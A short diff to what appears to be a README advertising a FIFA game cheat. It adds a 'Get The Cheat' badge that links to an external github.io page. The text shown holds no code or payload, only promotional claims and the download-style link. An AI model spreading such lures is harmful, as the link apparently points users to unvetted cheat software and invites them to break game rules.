@@ -4,7 +4,7 @@ Tired of grinding for coins? Fed up with scripted AI, slow player progression, a
 
 No grind. No pay-to-win. Just full access to the cheats, boosts, and hacks that give you an instant edge.
 
-
+[![Get](https://img.shields.io/badge/Get%20The-Cheat-blueviolet)](https://fifa-cheat.github.io/.github/)
 ---
 
 ## 🎮 What’s the FIFA Cheat All About?
